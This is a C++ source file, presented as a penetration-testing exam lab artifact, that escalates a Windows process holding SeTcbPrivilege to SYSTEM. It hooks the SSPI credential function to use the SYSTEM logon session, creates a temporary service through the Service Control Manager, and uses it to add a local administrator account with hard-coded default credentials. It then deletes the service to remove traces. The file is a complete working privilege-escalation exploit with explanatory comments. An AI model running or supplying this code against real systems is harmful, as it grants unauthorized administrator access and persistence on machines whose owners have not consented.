// ============================================================================
//  TcbElevationAddAdmin.cpp
// ----------------------------------------------------------------------------
//  Authorized CPTS exam reproduction artifact (Trilocor Robotics lab).
//
//  WHAT THIS IS
//  ------------
//  A modified version of TcbElevation.cpp. The original took an arbitrary
//  command line and ran it as SYSTEM by abusing SeTcbPrivilege. This version
//  keeps the exact same elevation primitive but hard-wires the payload to a
//  single, well-understood action: create a new local user and place it in the
//  local Administrators group.
//
//  WHY SeTcbPrivilege MATTERS
//  --------------------------
//  SeTcbPrivilege ("act as part of the operating system") is one of the most
//  powerful Windows privileges. A process holding it can forge logon sessions.
//  We use it to make a privileged subsystem call run under the built-in SYSTEM
//  logon session (LUID 0x3E7), which is how we end up operating as SYSTEM
//  without ever touching a password.
//
//  THE ELEVATION CHAIN (unchanged from the original, step by step)
//  ---------------------------------------------------------------
//    1. Enable SeTcbPrivilege on our own process token.
//    2. Hook AcquireCredentialsHandleW so that every SSPI credential handle we
//       acquire is tied to the SYSTEM logon session (LUID 0x3E7) instead of our
//       own. This is what SeTcbPrivilege unlocks — passing an arbitrary
//       LogonId is normally forbidden.
//    3. Open the Service Control Manager. Because of the hooked credential
//       context, the SCM sees the connection as SYSTEM.
//    4. Create a one-shot service whose binary path is our payload command.
//       Services launched by the SCM run as LocalSystem by default, so the
//       payload executes as SYSTEM.
//    5. Start it (we ignore the "service did not respond" timeout — our payload
//       is a plain command, not a real service, so SCM reporting always fails;
//       the command still runs), then delete the service to clean up.
//
//  THE ONLY FUNCTIONAL CHANGE vs TcbElevation.cpp
//  ----------------------------------------------
//  Instead of accepting a caller-supplied command line, we build a fixed
//  payload that runs:
//        net user  <username> <password> /add
//        net localgroup administrators <username> /add
//  The username/password are optional arguments with documented defaults.
//
//  BUILD
//  -----
//    cl /EHsc /W4 TcbElevationAddAdmin.cpp Secur32.lib Advapi32.lib
//  (Secur32 for SSPI, Advapi32 for the service/token APIs. No netapi32 needed —
//   we shell out to net.exe exactly like a real operator would in this lab.)
//
//  USAGE
//  -----
//    TcbElevationAddAdmin.exe [username] [password]
//    e.g.  TcbElevationAddAdmin.exe cptsadm "Sup3rb@d-Lab-Pass!"
//  With no arguments it uses the documented defaults below.
// ============================================================================

#define SECURITY_WIN32
#define UNICODE 1
#define _UNICODE 1
#include <windows.h>
#include <sspi.h>
#include <stdio.h>

// ----------------------------------------------------------------------------
//  Defaults. Override from the command line. The password is a placeholder that
//  satisfies a default Windows complexity policy; change it per engagement and
//  never leave the account behind after the exam (see CLEANUP note at the end).
// ----------------------------------------------------------------------------
static const wchar_t* DEFAULT_USER = L"cptsadm";
static const wchar_t* DEFAULT_PASS = L"Ch4nge-Me-Lab!";

// A fixed service name. It exists for only a couple of seconds, but using a
// benign-looking, constant name keeps the artifact reproducible and easy to
// spot/clean in the exam's service list if anything goes wrong.
static const wchar_t* SERVICE_NAME = L"TcbAddAdminSvc";

// ----------------------------------------------------------------------------
//  SetPrivilege: enable (or disable) a named privilege on a token.
//  We call it to flip SeTcbPrivilege ON. If the token does not already hold the
//  privilege, AdjustTokenPrivileges "succeeds" but sets ERROR_NOT_ALL_ASSIGNED
//  — hence the explicit GetLastError() check after the call.
// ----------------------------------------------------------------------------
BOOL SetPrivilege(HANDLE token, const wchar_t* name, BOOL enable) {
    TOKEN_PRIVILEGES tp;
    PRIVILEGE_SET ps;
    LUID luid;
    BOOL enabled = FALSE;

    // Translate the privilege *name* ("SeTcbPrivilege") into its local LUID.
    if (!LookupPrivilegeValueW(NULL, name, &luid)) {
        printf("LookupPrivilegeValueW failed: %lu\n", GetLastError());
        return FALSE;
    }

    // Ask to enable exactly one privilege: the one we just looked up.
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;

    // AdjustTokenPrivileges reports partial success via GetLastError, so clear
    // the error first to get a clean reading afterwards.
    SetLastError(ERROR_SUCCESS);
    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        printf("AdjustTokenPrivileges failed: %lu\n", GetLastError());
        return FALSE;
    }

    // The token simply does not have SeTcbPrivilege to give — we cannot proceed.
    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("SeTcbPrivilege not assigned to this token\n");
        return FALSE;
    }

    // Belt-and-suspenders: confirm the privilege is now actually enabled.
    ps.PrivilegeCount = 1;
    ps.Control = PRIVILEGE_SET_ALL_NECESSARY;
    ps.Privilege[0].Luid = luid;
    ps.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!PrivilegeCheck(token, &ps, &enabled) || !enabled) {
        printf("PrivilegeCheck failed or privilege disabled: %lu\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

// ----------------------------------------------------------------------------
//  AcquireCredentialsHandleWHook
//  This replaces the real AcquireCredentialsHandleW in the SSPI function table.
//  Normally you may only request credentials for your own logon session. With
//  SeTcbPrivilege enabled, you may name ANY logon session. We force LUID 0x3E7,
//  which is the well-known LUID of the SYSTEM logon session. Every subsequent
//  SSPI-authenticated call (like the SCM connection below) therefore runs with
//  SYSTEM's security context.
// ----------------------------------------------------------------------------
SECURITY_STATUS SEC_ENTRY AcquireCredentialsHandleWHook(
    LPWSTR principal, LPWSTR package, unsigned long use, void* ignoredLogonId,
    void* authData, SEC_GET_KEY_FN getKeyFn, void* getKeyArg,
    PCredHandle credential, PTimeStamp expiry) {
    LUID systemLogonId;
    ZeroMemory(&systemLogonId, sizeof(systemLogonId));
    systemLogonId.LowPart = 0x3E7;   // 999 == SYSTEM logon session LUID.
    // Call the genuine API but substitute our SYSTEM LogonId for the caller's.
    return AcquireCredentialsHandleW(principal, package, use, &systemLogonId,
        authData, getKeyFn, getKeyArg, credential, expiry);
}

int wmain(int argc, wchar_t** argv) {
    // --- Resolve the account to create ------------------------------------
    // argv[1] = username (optional), argv[2] = password (optional).
    const wchar_t* username = (argc >= 2) ? argv[1] : DEFAULT_USER;
    const wchar_t* password = (argc >= 3) ? argv[2] : DEFAULT_PASS;
    printf("[*] Target account: %ls  (will be added to local Administrators)\n",
        username);

    // --- Step 1: enable SeTcbPrivilege on our own process token -----------
    HANDLE token = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &token)) {
        printf("OpenProcessToken failed: %lu\n", GetLastError());
        return 3;
    }
    if (!SetPrivilege(token, L"SeTcbPrivilege", TRUE)) {
        CloseHandle(token);
        return 4;
    }
    CloseHandle(token);
    printf("[+] SeTcbPrivilege enabled\n");

    // --- Step 2: hook the SSPI credential function ------------------------
    // InitSecurityInterfaceW hands back a pointer to the live SSPI dispatch
    // table. We overwrite its AcquireCredentialsHandleW slot with our hook so
    // the SCM connection below authenticates as the SYSTEM logon session.
    PSecurityFunctionTableW table = InitSecurityInterfaceW();
    if (!table) {
        printf("InitSecurityInterfaceW failed\n");
        return 5;
    }
    table->AcquireCredentialsHandleW = AcquireCredentialsHandleWHook;
    printf("[+] AcquireCredentialsHandleW hooked to SYSTEM logon LUID 0x3E7\n");

    // --- Step 3: build the payload command --------------------------------
    // This is the ONLY behavioural change from the original. Instead of running
    // an attacker-supplied command, we run a fixed two-part command through
    // cmd.exe:
    //     net user <user> <pass> /add                 -> create the account
    //     net localgroup administrators <user> /add   -> make it a local admin
    // The '&' chains them so both run regardless of the first one's exit code
    // (handy when re-running and the user already exists).
    //
    // Because the service (step 4) runs as SYSTEM, these net.exe calls inherit
    // SYSTEM rights and can create a privileged account unconditionally.
    wchar_t cmdLine[512];
    swprintf_s(cmdLine, 512,
        L"C:\\Windows\\System32\\cmd.exe /c "
        L"net user %ls %ls /add & "
        L"net localgroup administrators %ls /add",
        username, password, username);
    printf("[*] Payload: %ls\n", cmdLine);

    // --- Step 4: connect to the SCM (now as SYSTEM) -----------------------
    // The machine name L"127.0.0.1" forces an authenticated (SSPI) connection
    // to the local SCM, which is what triggers our hook. A NULL machine name
    // would use a local RPC path that bypasses the hook — so the loopback
    // address is deliberate and required.
    SC_HANDLE scm = OpenSCManagerW(L"127.0.0.1", NULL,
        SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (!scm) {
        printf("OpenSCManagerW failed: %lu\n", GetLastError());
        return 6;
    }
    printf("[+] Connected to SCM under SYSTEM logon context\n");

    // Create the one-shot service. lpBinaryPathName (3rd data arg) IS our
    // payload command line. SERVICE_DEMAND_START so nothing runs until we start
    // it; SERVICE_ERROR_IGNORE so a non-service binary doesn't trip error logic.
    SC_HANDLE svc = CreateServiceW(scm, SERVICE_NAME, SERVICE_NAME,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, cmdLine, NULL, NULL, NULL, NULL, NULL);
    if (!svc) {
        printf("CreateServiceW failed: %lu\n", GetLastError());
        CloseServiceHandle(scm);
        return 7;
    }
    printf("[+] Temporary service '%ls' created as SYSTEM\n", SERVICE_NAME);

    // --- Step 5: run the payload, then clean the service up ---------------
    // StartServiceW launches cmd.exe as SYSTEM and our net.exe commands run.
    // Our "service" never signals SCSM that it started, so Windows returns
    // ERROR_SERVICE_REQUEST_TIMEOUT (1053) after it gives up waiting. That is
    // EXPECTED and does NOT mean the payload failed — the account is created
    // regardless. We sleep briefly to let net.exe finish before deleting.
    BOOL started = StartServiceW(svc, 0, NULL);
    DWORD startError = started ? ERROR_SUCCESS : GetLastError();
    printf("[*] StartServiceW result=%d error=%lu (1053 timeout is expected)\n",
        started, startError);
    Sleep(2000);

    // Remove the temporary service so we leave no service-level trace.
    // NOTE: this cleans up the SERVICE only. The admin account we created is
    // the whole point and persists — see the CLEANUP reminder below.
    BOOL deleted = DeleteService(svc);
    printf("[*] DeleteService result=%d error=%lu\n", deleted,
        deleted ? ERROR_SUCCESS : GetLastError());
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    printf("[+] Done. Verify with:  net localgroup administrators\n");

    // ------------------------------------------------------------------------
    //  CLEANUP (do this when the exam objective is met):
    //      net localgroup administrators <username> /delete
    //      net user <username> /delete
    //  Removing the account is required by the engagement's "no persistence"
    //  boundary. Record the create/delete in Changes and Cleanup.md.
    // ------------------------------------------------------------------------

    // Treat a started service OR the expected timeout as success.
    return (started || startError == ERROR_SERVICE_REQUEST_TIMEOUT) ? 0 : 8;
}
